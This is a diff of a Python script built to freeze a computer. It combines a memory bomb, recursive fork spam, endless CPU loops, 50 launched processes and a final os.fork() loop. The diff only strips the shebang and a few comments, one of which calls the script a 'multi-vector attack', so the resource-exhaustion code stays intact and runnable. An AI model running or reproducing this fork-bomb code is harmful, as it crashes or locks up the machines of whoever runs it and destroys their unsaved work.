@@ -1,4 +1,3 @@
-#!/usr/bin/env python3
 import os
 import sys
 from multiprocessing import Process
@@ -15,8 +14,8 @@ def memory_bomb():
     """Allocate massive memory to choke the system"""
     data = []
     while True:
-        data.append(' ' * 10**6)  # 1MB chunks
-        data.append(data[:])  # Duplicate to eat RAM faster
+        data.append(' ' * 10**6)
+        data.append(data[:])
 
 def fork_spam():
     """Spawn processes recursively"""
@@ -30,15 +29,12 @@ def fork_spam():
             pass
 
 def cpu_burn():
-    """Max out CPU"""
     while True:
         pass
 
 if __name__ == '__main__':
-    # Show message first
     display_message()
     
-    # Multi-vector attack: forks + memory + CPU
     for i in range(50):
         try:
             Process(target=fork_spam).start()
@@ -47,6 +43,5 @@ if __name__ == '__main__':
         except:
             pass
     
-    # Main process also contributes to freeze
     while True:
         os.fork()
